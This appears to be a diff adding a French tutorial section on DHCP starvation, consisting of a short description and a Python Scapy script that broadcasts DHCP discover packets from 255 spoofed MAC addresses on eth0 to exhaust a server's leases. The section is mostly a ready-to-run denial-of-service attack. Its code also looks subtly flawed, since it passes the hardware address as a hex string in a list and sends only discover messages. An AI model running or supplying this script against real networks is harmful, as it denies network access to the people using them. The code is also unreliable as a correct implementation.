@@ -1,0 +1,20 @@
+4. Saturation de service DHCP
+Cette attaque envoie une grande quantité de requêtes DHCP pour saturer le serveur.
+Script Python : DHCP Starvation
+from scapy.all import *
+
+def dhcp_starvation(interface):
+    print("Lancement de la saturation DHCP")
+    mac_base = "02:00:00:00:00:{:02x}"
+    for i in range(1, 256):
+        mac = mac_base.format(i)
+        dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
+                        IP(src="0.0.0.0", dst="255.255.255.255") / \
+                        UDP(sport=68, dport=67) / \
+                        BOOTP(chaddr=[mac.replace(":", "")]) / \
+                        DHCP(options=[("message-type", "discover"), "end"])
+        sendp(dhcp_discover, iface=interface, verbose=False)
+
+# Interface réseau (exemple : eth0)
+dhcp_starvation("eth0")
+
